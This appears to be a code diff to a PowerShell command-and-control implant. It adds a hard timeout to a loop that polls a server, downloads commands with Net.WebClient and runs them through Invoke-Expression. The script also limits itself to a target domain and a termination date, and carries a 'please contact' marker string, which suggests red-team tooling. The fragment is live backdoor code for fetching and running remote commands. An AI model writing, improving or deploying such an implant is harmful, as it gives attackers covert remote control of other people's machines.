@@ -1,6 +1,7 @@
 $server = "http://127.0.0.1:8080"
 $pollmin = 1
 $pollmax = 5
+$timeout = 30
 $terminationdate = Get-Date -Date "2020-01-01 00:00:00"
 $targetdomain = "TARGETDOMAIN"
 $markercontents = "If found, please contact XXX"
@@ -38,12 +39,22 @@ while((Get-Date)  -lt $terminationdate)
     # Get the current epoch time. Should stop responses being cached by intermediary devices like proxies.
     $time = [int64](([datetime]::UtcNow)-(get-date "1/1/1970")).TotalSeconds
 
-    # Make the request and execute using IEX
+    # Make the request and execute using IEX. Wrapped as a job to force a timeout after $timeout
     try {
         $command = (New-Object Net.WebClient).DownloadString("$server/c?i=$uuid&t=$time")
         try {
             if ($command) {
-                $output = Invoke-Expression ($command) | out-string 
+                $job = start-job -scriptblock {
+                    param($c)
+                    Invoke-Expression ($c) | out-string 
+                } -Arg $command
+                if (wait-job $job -Timeout $timeout) {
+                    $output = receive-job $job
+                }
+                else {
+                    $output = "Hard timeout received"
+                    Remove-Job -force $job
+                }
             }
         } 
         catch {
